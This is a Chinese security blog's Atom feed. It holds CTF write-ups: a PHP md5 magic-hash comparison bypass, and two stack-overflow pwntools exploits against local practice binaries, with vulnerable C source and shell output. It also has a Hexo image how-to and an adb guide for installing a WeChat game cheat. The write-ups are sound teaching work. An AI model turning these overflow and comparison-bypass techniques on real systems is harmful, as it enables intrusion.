<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>iosmosis&#39;s blog</title>
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://iosmosis.github.io/"/>
  <updated>2018-04-02T17:04:36.230Z</updated>
  <id>http://iosmosis.github.io/</id>
  
  <author>
    <name>iosmosis</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>第二届强网杯部分Writeup</title>
    <link href="http://iosmosis.github.io/2018/03/24/%E7%AC%AC%E4%BA%8C%E5%B1%8A%E5%BC%BA%E7%BD%91%E6%9D%AF%E9%83%A8%E5%88%86Writeup/"/>
    <id>http://iosmosis.github.io/2018/03/24/第二届强网杯部分Writeup/</id>
    <published>2018-03-24T11:31:37.000Z</published>
    <updated>2018-04-02T17:04:36.230Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Web签到"><a href="#Web签到" class="headerlink" title="Web签到"></a>Web签到</h2><h4 id="进入web签到给的地址-http-39-107-33-96-10000"><a href="#进入web签到给的地址-http-39-107-33-96-10000" class="headerlink" title="进入web签到给的地址 http://39.107.33.96:10000/"></a>进入web签到给的地址 <a href="http://39.107.33.96:10000/" target="_blank" rel="external">http://39.107.33.96:10000/</a></h4><p><img src="/2018/03/24/第二届强网杯部分Writeup/1.jpg" alt="网站入口"></p>
<h4 id="查看下网站源码-发现hint"><a href="#查看下网站源码-发现hint" class="headerlink" title="查看下网站源码 发现hint"></a>查看下网站源码 发现hint</h4><p><img src="/2018/03/24/第二届强网杯部分Writeup/2.jpg" alt="网站源码"></p>
<h4 id="需要post-“param1”-“param2”-两个值-不能相等但必须md5值相等-，根据了解-这算是一种php弱类型"><a href="#需要post-“param1”-“param2”-两个值-不能相等但必须md5值相等-，根据了解-这算是一种php弱类型" class="headerlink" title="需要post “param1” “param2” 两个值 不能相等但必须md5值相等 ，根据了解 这算是一种php弱类型"></a>需要post “param1” “param2” 两个值 不能相等但必须md5值相等 ，根据了解 这算是一种php弱类型</h4><h3 id="根据了解找到一组值"><a href="#根据了解找到一组值" class="headerlink" title="根据了解找到一组值"></a>根据了解找到一组值</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">md5(240610708,32) = 0e462097431906509019562988736854</div><div class="line">md5(240610708,16) = 4319065090195629</div><div class="line"></div><div class="line">md5(QNKCDZO,32) = 0e830400451993494058024219903391</div><div class="line">md5(QNKCDZO,16) = 4519934940580242</div></pre></td></tr></table></figure>
<h4 id="上文提到过，0e在比较的时候会将其视作为科学计数法，所以无论0e后面是什么，0的多少次方还是0。md5-‘240610708’-md5-‘QNKCDZO’-成功绕过"><a href="#上文提到过，0e在比较的时候会将其视作为科学计数法，所以无论0e后面是什么，0的多少次方还是0。md5-‘240610708’-md5-‘QNKCDZO’-成功绕过" class="headerlink" title="上文提到过，0e在比较的时候会将其视作为科学计数法，所以无论0e后面是什么，0的多少次方还是0。md5(‘240610708’) == md5(‘QNKCDZO’)成功绕过!"></a>上文提到过，0e在比较的时候会将其视作为科学计数法，所以无论0e后面是什么，0的多少次方还是0。md5(‘240610708’) == md5(‘QNKCDZO’)成功绕过!</h4><h3 id="来到第二关"><a href="#来到第二关" class="headerlink" title="来到第二关"></a>来到第二关</h3><p><img src="/2018/03/24/第二届强网杯部分Writeup/3.jpg" alt="网站2"></p>
<h4 id="查看网站源码"><a href="#查看网站源码" class="headerlink" title="查看网站源码"></a>查看网站源码</h4><p><img src="/2018/03/24/第二届强网杯部分Writeup/4.jpg" alt="源码2"></p>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;Web签到&quot;&gt;&lt;a href=&quot;#Web签到&quot; class=&quot;headerlink&quot; title=&quot;Web签到&quot;&gt;&lt;/a&gt;Web签到&lt;/h2&gt;&lt;h4 id=&quot;进入web签到给的地址-http-39-107-33-96-10000&quot;&gt;&lt;a href=&quot;#进入web签
    
    </summary>
    
    
      <category term="强网杯" scheme="http://iosmosis.github.io/tags/%E5%BC%BA%E7%BD%91%E6%9D%AF/"/>
    
      <category term="Writeup" scheme="http://iosmosis.github.io/tags/Writeup/"/>
    
      <category term="Web" scheme="http://iosmosis.github.io/tags/Web/"/>
    
  </entry>
  
  <entry>
    <title>Jarvis OJ Pwn writeup</title>
    <link href="http://iosmosis.github.io/2018/03/21/Jarvis-OJ-Pwn-writeup/"/>
    <id>http://iosmosis.github.io/2018/03/21/Jarvis-OJ-Pwn-writeup/</id>
    <published>2018-03-21T07:16:36.000Z</published>
    <updated>2018-03-21T07:47:48.084Z</updated>
    
    <content type="html"><![CDATA[<p>此篇记录关于Jarvis OJ Pwn所有题目的writeup</p>
<h2 id="XMAN-level0"><a href="#XMAN-level0" class="headerlink" title="[XMAN]level0"></a>[XMAN]level0</h2><h4 id="进行chack"><a href="#进行chack" class="headerlink" title="进行chack"></a>进行chack</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">[*] <span class="string">'/home/ios/Desktop/pwn0'</span></div><div class="line">    Arch:     amd64-64-little</div><div class="line">    RELRO:    No RELRO</div><div class="line">    Stack:    No canary found</div><div class="line">    NX:       NX enabled</div><div class="line">    PIE:      No PIE (0x400000)</div></pre></td></tr></table></figure>
<ul>
<li><a id="more"></a>
<the rest="" of="" contents="" |="" 余下全文=""><br>NX开启 栈溢出保护关闭 <h4 id="附件拖入ida"><a href="#附件拖入ida" class="headerlink" title="附件拖入ida"></a>附件拖入ida</h4></the></li>
</ul>
<p><img src="/2018/03/21/Jarvis-OJ-Pwn-writeup/1.jpg" alt="ida"></p>
<p>main函数里跳转到了vulnerable_function()</p>
<h4 id="跟进"><a href="#跟进" class="headerlink" title="跟进"></a>跟进</h4><p><img src="/2018/03/21/Jarvis-OJ-Pwn-writeup/2.jpg" alt="ida1"></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">可以看到<span class="built_in">read</span>可读的大小为0x200 512字节</div><div class="line">buf大小为0x80字节</div></pre></td></tr></table></figure>
<h4 id="查看函数窗口-找到callsystem-查看代码发现已经写好了shell"><a href="#查看函数窗口-找到callsystem-查看代码发现已经写好了shell" class="headerlink" title="查看函数窗口 找到callsystem() 查看代码发现已经写好了shell"></a>查看函数窗口 找到callsystem() 查看代码发现已经写好了shell</h4><p>屡一下流程 main函数跳转到了vulnerable_function()然后 read一个大小不超过512的字节 然后返回函数</p>
<p>思路很清晰了 我们需要将vulnerable_function()函数的返回地址覆盖为callsystem()函数的地址即可成功getshell</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">buf <span class="number">0x80</span></div><div class="line">ebp <span class="number">0x8</span></div><div class="line">淹没bp <span class="number">0x80</span>+<span class="number">0x8</span></div><div class="line">callsystem_addr = <span class="number">0x400596</span></div></pre></td></tr></table></figure>
<h3 id="编写exp"><a href="#编写exp" class="headerlink" title="编写exp"></a>编写exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line"></div><div class="line">p = process(<span class="string">'./pwn0'</span>)</div><div class="line"></div><div class="line">callsystem_addr = <span class="number">0x400596</span></div><div class="line"></div><div class="line">payload = <span class="string">'A'</span>*<span class="number">0x88</span> +p64(callsystem_addr)</div><div class="line"></div><div class="line">p.sendline(payload)</div><div class="line"></div><div class="line">p.interactive()</div></pre></td></tr></table></figure>
<h3 id="运行结果"><a href="#运行结果" class="headerlink" title="运行结果"></a>运行结果</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">ios@ubuntu:~/Desktop$ python pwn0.py</div><div class="line">[+] Starting <span class="built_in">local</span> process <span class="string">'./pwn0'</span>: pid 3517</div><div class="line">[*] Switching to interactive mode</div><div class="line">Hello, World</div><div class="line">$ ls</div><div class="line">core               peda-session-pwn50.txt  pwn0.py    pwn50.py</div><div class="line">peda-session-pwn0.txt  pwn0               pwn50</div><div class="line">$</div></pre></td></tr></table></figure>
<p>成功getshell</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;此篇记录关于Jarvis OJ Pwn所有题目的writeup&lt;/p&gt;
&lt;h2 id=&quot;XMAN-level0&quot;&gt;&lt;a href=&quot;#XMAN-level0&quot; class=&quot;headerlink&quot; title=&quot;[XMAN]level0&quot;&gt;&lt;/a&gt;[XMAN]level0&lt;/h2&gt;&lt;h4 id=&quot;进行chack&quot;&gt;&lt;a href=&quot;#进行chack&quot; class=&quot;headerlink&quot; title=&quot;进行chack&quot;&gt;&lt;/a&gt;进行chack&lt;/h4&gt;&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;[*] &lt;span class=&quot;string&quot;&gt;&#39;/home/ios/Desktop/pwn0&#39;&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    Arch:     amd64-64-little&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    RELRO:    No RELRO&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    Stack:    No canary found&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    NX:       NX enabled&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    PIE:      No PIE (0x400000)&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;ul&gt;
&lt;li&gt;&lt;/li&gt;&lt;/ul&gt;
    
    </summary>
    
    
      <category term="Pwn" scheme="http://iosmosis.github.io/tags/Pwn/"/>
    
      <category term="Jarvis OJ" scheme="http://iosmosis.github.io/tags/Jarvis-OJ/"/>
    
      <category term="栈溢出" scheme="http://iosmosis.github.io/tags/%E6%A0%88%E6%BA%A2%E5%87%BA/"/>
    
      <category term="writeup" scheme="http://iosmosis.github.io/tags/writeup/"/>
    
  </entry>
  
  <entry>
    <title>When Did You Born</title>
    <link href="http://iosmosis.github.io/2018/03/21/When-Did-You-Born/"/>
    <id>http://iosmosis.github.io/2018/03/21/When-Did-You-Born/</id>
    <published>2018-03-21T02:49:50.000Z</published>
    <updated>2018-03-21T03:25:20.219Z</updated>
    
    <content type="html"><![CDATA[<p>南邮CTF的一道简单pwn100题目</p>
<p><img src="/2018/03/21/When-Did-You-Born/1.jpg" alt="题目信息"></p>
<ul>
<li><a id="more"></a>
<the rest="" of="" contents="" |="" 余下全文=""><h4 id="题目提供了源文件-可以看下代码了解流程"><a href="#题目提供了源文件-可以看下代码了解流程" class="headerlink" title="题目提供了源文件 可以看下代码了解流程"></a>题目提供了源文件 可以看下代码了解流程</h4></the></li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="keyword">struct</span> Student &#123;</div><div class="line">    <span class="keyword">char</span> name[<span class="number">8</span>];</div><div class="line">    <span class="keyword">int</span> birth;</div><div class="line">&#125;;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</div><div class="line">    <span class="keyword">struct</span> Student student;</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"What\'s Your Birth?\n"</span>);</div><div class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;student.birth);</div><div class="line">    <span class="keyword">while</span> (getchar() != <span class="string">'\n'</span>) ;</div><div class="line">    <span class="keyword">if</span> (student.birth == <span class="number">1926</span>) &#123;</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"You Cannot Born In 1926!\n"</span>);</div><div class="line">        <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">    &#125;</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"What\'s Your Name?\n"</span>);</div><div class="line">    gets(student.name);</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"You Are Born In %d\n"</span>, student.birth);</div><div class="line">    <span class="keyword">if</span> (student.birth == <span class="number">1926</span>) &#123;</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"You Shall Have Flag.\n"</span>);</div><div class="line">        system(<span class="string">"cat flag"</span>);</div><div class="line">    &#125; <span class="keyword">else</span> &#123;</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"You Are Naive.\n"</span>);</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"You Speed One Second Here.\n"</span>);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h4 id="主要流程再讲得输入一个birth-如果birth-1926就能getflag-但是直接输入1926就结束程序"><a href="#主要流程再讲得输入一个birth-如果birth-1926就能getflag-但是直接输入1926就结束程序" class="headerlink" title="主要流程再讲得输入一个birth 如果birth=1926就能getflag 但是直接输入1926就结束程序"></a>主要流程再讲得输入一个birth 如果birth=1926就能getflag 但是直接输入1926就结束程序</h4><h4 id="可以很容易的发现gets函数没有做任何限制"><a href="#可以很容易的发现gets函数没有做任何限制" class="headerlink" title="可以很容易的发现gets函数没有做任何限制"></a>可以很容易的发现gets函数没有做任何限制</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">ios@ubuntu:~$ checksec <span class="built_in">test</span></div><div class="line">[*] <span class="string">'/home/ios/test'</span></div><div class="line">    Arch:     amd64-64-little</div><div class="line">    RELRO:    Partial RELRO</div><div class="line">    Stack:    Canary found</div><div class="line">    NX:       NX enabled</div><div class="line">    PIE:      No PIE (0x400000)</div><div class="line">ios@ubuntu:~$</div></pre></td></tr></table></figure>
<h4 id="栈溢出保护开启-NX开启"><a href="#栈溢出保护开启-NX开启" class="headerlink" title="栈溢出保护开启 NX开启"></a>栈溢出保护开启 NX开启</h4><h4 id="使用objdump-S-test-M-intel-来查看相关汇编指令"><a href="#使用objdump-S-test-M-intel-来查看相关汇编指令" class="headerlink" title="使用objdump -S test -M intel 来查看相关汇编指令"></a>使用objdump -S test -M intel 来查看相关汇编指令</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line">40073e:	48 89 45 f8          	mov    QWORD PTR [rbp-0x8],rax</div><div class="line">400742:	31 c0                	xor    eax,eax</div><div class="line">400744:	bf 94 08 40 00       	mov    edi,0x400894</div><div class="line">400749:	e8 62 fe ff ff       	call   4005b0 &lt;puts@plt&gt;</div><div class="line">40074e:	48 8d 45 e0          	lea    rax,[rbp-0x20]</div><div class="line">400752:	48 83 c0 08          	add    rax,0x8</div><div class="line">400756:	48 89 c6             	mov    rsi,rax</div><div class="line">400759:	bf a7 08 40 00       	mov    edi,0x4008a7</div><div class="line">40075e:	b8 00 00 00 00       	mov    eax,0x0</div><div class="line">400763:	e8 c8 fe ff ff       	call   400630 &lt;__isoc99_scanf@plt&gt;</div><div class="line">400768:	90                   	nop</div><div class="line">400769:	e8 92 fe ff ff       	call   400600 &lt;getchar@plt&gt;</div><div class="line">40076e:	83 f8 0a             	cmp    eax,0xa</div><div class="line">400771:	75 f6                	jne    400769 &lt;main+0x3c&gt;</div><div class="line">400773:	8b 45 e8             	mov    eax,DWORD PTR [rbp-0x18]</div><div class="line">400776:	3d 86 07 00 00       	cmp    eax,0x786</div><div class="line">40077b:	75 11                	jne    40078e &lt;main+0x61&gt;</div><div class="line">40077d:	bf aa 08 40 00       	mov    edi,0x4008aa</div><div class="line">400782:	e8 29 fe ff ff       	call   4005b0 &lt;puts@plt&gt;</div><div class="line">400787:	b8 00 00 00 00       	mov    eax,0x0</div><div class="line">40078c:	eb 68                	jmp    4007f6 &lt;main+0xc9&gt;</div><div class="line">40078e:	bf c3 08 40 00       	mov    edi,0x4008c3</div><div class="line">400793:	e8 18 fe ff ff       	call   4005b0 &lt;puts@plt&gt;</div><div class="line">400798:	48 8d 45 e0          	lea    rax,[rbp-0x20]</div></pre></td></tr></table></figure>
<h4 id="可以看出-birth地址位于-rbp-0x20-0x8-而-name地址位于-rbp-0x20"><a href="#可以看出-birth地址位于-rbp-0x20-0x8-而-name地址位于-rbp-0x20" class="headerlink" title="可以看出 .birth地址位于[rbp-0x20+0x8] 而 .name地址位于[rbp-0x20]"></a>可以看出 .birth地址位于[rbp-0x20+0x8] 而 .name地址位于[rbp-0x20]</h4><h4 id="所以在gets函数处输入0x8字节就可以达到-birth地址"><a href="#所以在gets函数处输入0x8字节就可以达到-birth地址" class="headerlink" title="所以在gets函数处输入0x8字节就可以达到.birth地址"></a>所以在gets函数处输入0x8字节就可以达到.birth地址</h4><h4 id="构造exp"><a href="#构造exp" class="headerlink" title="构造exp"></a>构造exp</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line"></div><div class="line">p = process(<span class="string">'./test'</span>)</div><div class="line"></div><div class="line">payload=<span class="string">'A'</span>*<span class="number">8</span>+p64(<span class="number">1926</span>)</div><div class="line"></div><div class="line">p.sendline(<span class="string">'ios'</span>)</div><div class="line"><span class="keyword">print</span> p.recv()</div><div class="line">p.sendline(payload)</div><div class="line"><span class="keyword">print</span> p.recv()</div><div class="line"><span class="keyword">print</span> p.recv()</div></pre></td></tr></table></figure>
<h4 id="由于是在本地测试-就自己建了个flag"><a href="#由于是在本地测试-就自己建了个flag" class="headerlink" title="由于是在本地测试 就自己建了个flag"></a>由于是在本地测试 就自己建了个flag</h4><h4 id="测试结果"><a href="#测试结果" class="headerlink" title="测试结果"></a>测试结果</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line">ios@ubuntu:~$ python test.py</div><div class="line">[+] Starting <span class="built_in">local</span> process <span class="string">'./test'</span>: pid 3064</div><div class="line">What<span class="string">'s Your Birth?</span></div><div class="line">What's Your Name?</div><div class="line"></div><div class="line">You Are Born In 1926</div><div class="line">You Shall Have Flag.</div><div class="line"></div><div class="line">[*] Stopped process <span class="string">'./test'</span> (pid 3064)</div><div class="line">ios@ubuntu:~$ python test.py</div><div class="line">[+] Starting <span class="built_in">local</span> process <span class="string">'./test'</span>: pid 3078</div><div class="line">What<span class="string">'s Your Birth?</span></div><div class="line">What's Your Name?</div><div class="line"></div><div class="line">You Are Born In 1926</div><div class="line">You Shall Have Flag.</div><div class="line"></div><div class="line">oh! you get this flag!</div><div class="line"></div><div class="line">[*] Process <span class="string">'./test'</span> stopped with <span class="built_in">exit</span> code 0 (pid 3078)</div></pre></td></tr></table></figure>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;南邮CTF的一道简单pwn100题目&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/2018/03/21/When-Did-You-Born/1.jpg&quot; alt=&quot;题目信息&quot;&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;/li&gt;&lt;/ul&gt;
    
    </summary>
    
    
      <category term="Pwn" scheme="http://iosmosis.github.io/tags/Pwn/"/>
    
      <category term="栈溢出" scheme="http://iosmosis.github.io/tags/%E6%A0%88%E6%BA%A2%E5%87%BA/"/>
    
      <category term="南邮CTF" scheme="http://iosmosis.github.io/tags/%E5%8D%97%E9%82%AECTF/"/>
    
  </entry>
  
  <entry>
    <title>关于hexo添加图片的问题</title>
    <link href="http://iosmosis.github.io/2018/03/20/hexofix/"/>
    <id>http://iosmosis.github.io/2018/03/20/hexofix/</id>
    <published>2018-03-20T15:37:28.000Z</published>
    <updated>2018-03-20T17:05:32.853Z</updated>
    
    <content type="html"><![CDATA[<p>解决了关于hexo文章内部引用图片的问题</p>
<h4 id="找到你建立的hexo网站的主页配置文件-“-config-yml”"><a href="#找到你建立的hexo网站的主页配置文件-“-config-yml”" class="headerlink" title="找到你建立的hexo网站的主页配置文件 “_config.yml”"></a>找到你建立的hexo网站的主页配置文件 “_config.yml”</h4><p><img src="/2018/03/20/hexofix/2.jpg" alt="主页配置文件"></p>
<ul>
<li><a id="more"></a>
<the rest="" of="" contents="" |="" 余下全文=""><h4 id="打开配置文件-找到“post-asset-folder-这个选项设置为true”"><a href="#打开配置文件-找到“post-asset-folder-这个选项设置为true”" class="headerlink" title="打开配置文件 找到“post_asset_folder:这个选项设置为true”"></a>打开配置文件 找到“post_asset_folder:这个选项设置为true”</h4><img src="/2018/03/20/hexofix/3.jpg" alt="修改文件"></the></li>
</ul>
<h4 id="打开终端-进入hexo安装目录-并用npm安装image上传插件"><a href="#打开终端-进入hexo安装目录-并用npm安装image上传插件" class="headerlink" title="打开终端 进入hexo安装目录 并用npm安装image上传插件"></a>打开终端 进入hexo安装目录 并用npm安装image上传插件</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">npm install hexo-asset-image --save</div></pre></td></tr></table></figure>
<p><img src="/2018/03/20/hexofix/4.jpg" alt="bash"></p>
<h4 id="安装完成后-可以尝试一下-重新创建一篇文章"><a href="#安装完成后-可以尝试一下-重新创建一篇文章" class="headerlink" title="安装完成后 可以尝试一下 重新创建一篇文章"></a>安装完成后 可以尝试一下 重新创建一篇文章</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">hexo n <span class="string">"test"</span></div></pre></td></tr></table></figure>
<h4 id="执行完毕-可以看到-posts目录不仅创建了test-md还创建了一个test目录"><a href="#执行完毕-可以看到-posts目录不仅创建了test-md还创建了一个test目录" class="headerlink" title="执行完毕 可以看到 _posts目录不仅创建了test.md还创建了一个test目录"></a>执行完毕 可以看到 _posts目录不仅创建了test.md还创建了一个test目录</h4><p><img src="/2018/03/20/hexofix/5.jpg" alt="目录"></p>
<h4 id="在test目录里添加你需要的图片就可以了-并且使用markdown图片引用即可"><a href="#在test目录里添加你需要的图片就可以了-并且使用markdown图片引用即可" class="headerlink" title="在test目录里添加你需要的图片就可以了 并且使用markdown图片引用即可"></a>在test目录里添加你需要的图片就可以了 并且使用markdown图片引用即可</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#使用命令</span></div><div class="line">![图片名称](xx/xxx.jpg) <span class="comment">#xx代表创建文章时同时创建的文件夹 本文应该为test xxx.jpg就是存放在目录里面的图片名称了</span></div></pre></td></tr></table></figure>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;解决了关于hexo文章内部引用图片的问题&lt;/p&gt;
&lt;h4 id=&quot;找到你建立的hexo网站的主页配置文件-“-config-yml”&quot;&gt;&lt;a href=&quot;#找到你建立的hexo网站的主页配置文件-“-config-yml”&quot; class=&quot;headerlink&quot; title=&quot;找到你建立的hexo网站的主页配置文件 “_config.yml”&quot;&gt;&lt;/a&gt;找到你建立的hexo网站的主页配置文件 “_config.yml”&lt;/h4&gt;&lt;p&gt;&lt;img src=&quot;/2018/03/20/hexofix/2.jpg&quot; alt=&quot;主页配置文件&quot;&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;/li&gt;&lt;/ul&gt;
    
    </summary>
    
    
      <category term="Hexo" scheme="http://iosmosis.github.io/tags/Hexo/"/>
    
      <category term="修复问题" scheme="http://iosmosis.github.io/tags/%E4%BF%AE%E5%A4%8D%E9%97%AE%E9%A2%98/"/>
    
  </entry>
  
  <entry>
    <title>微信游戏跳一跳之简单配置使用waigua</title>
    <link href="http://iosmosis.github.io/2017/12/31/jump/"/>
    <id>http://iosmosis.github.io/2017/12/31/jump/</id>
    <published>2017-12-31T13:59:46.000Z</published>
    <updated>2017-12-31T14:57:25.318Z</updated>
    
    <content type="html"><![CDATA[<p>为啥写这篇文章0.0  因为总有人在问adb是什么啊？怎么用啊？为什么我运行不了？之类的问题<br>就来写一篇指导文章</p>
<h3 id="准备环境"><a href="#准备环境" class="headerlink" title="准备环境"></a>准备环境</h3><p>1.逍遥模拟器并启动Android5.1系统<br>2.jump文件</p>
<ul>
<li><a id="more"></a>
</li>
</ul>
<h3 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h3><p>启动模拟器并下载好最新版微信<br>打开跳一跳 并点击开始游戏<br><a href="http://imglf5.nosdn.127.net/img/L241Y0htMkgzZUF3a0x0eDhTU2tvalRqSzRyM2R1b01WdElwQUcwMWFmVWdTU29lNTYvd0dBPT0.png?imageView&amp;thumbnail=1680x0&amp;quality=96&amp;stripmeta=0" target="_blank" rel="external">wechat.png</a></p>
<p>接着打开找到逍遥模拟器安装路径并找到附带的adb路径<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">D:\Program Files\Microvirt\MEmu</div></pre></td></tr></table></figure></p>
<p><a href="http://imglf5.nosdn.127.net/img/L241Y0htMkgzZUF3a0x0eDhTU2tvdVE0czFZMVcvT0VoWGkyd0JJTEZ4K0xNeloyb2hVK1dBPT0.png?imageView&amp;thumbnail=1680x0&amp;quality=96&amp;stripmeta=0" target="_blank" rel="external">dir.png</a></p>
<p>在此目录启动cmd 查看监听端口<br>并且启动adb服务</p>
<p><a href="http://imglf5.nosdn.127.net/img/L241Y0htMkgzZUF3a0x0eDhTU2tvamVweDlEeXVIS3QvTXJIcUE0NFhjWG5obHY1eC8wMmNBPT0.png?imageView&amp;thumbnail=1680x0&amp;quality=96&amp;stripmeta=0" target="_blank" rel="external">start.png</a></p>
<p>接着把准备好的jump文件放在adb所在目录<br>接下来就可以push了<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">adb push ./youjumpijump /data/<span class="built_in">local</span>/tmp/youjumpijump</div></pre></td></tr></table></figure></p>
<p><a href="http://imglf3.nosdn.127.net/img/L241Y0htMkgzZUF3a0x0eDhTU2tvdjNWRE56YzJOdnVVMUlNM1lDTE5iYkFCbVFZWG5JTG53PT0.png?imageView&amp;thumbnail=1680x0&amp;quality=96&amp;stripmeta=0" target="_blank" rel="external">push.png</a></p>
<p>接着运行shell </p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">adb shell</div></pre></td></tr></table></figure>
<p>转到目录/data/local/tmp<br>查看当前目录<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ls</div></pre></td></tr></table></figure></p>
<p>修改waigua文件的权限<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">chmod 777 youjumpijump</div></pre></td></tr></table></figure></p>
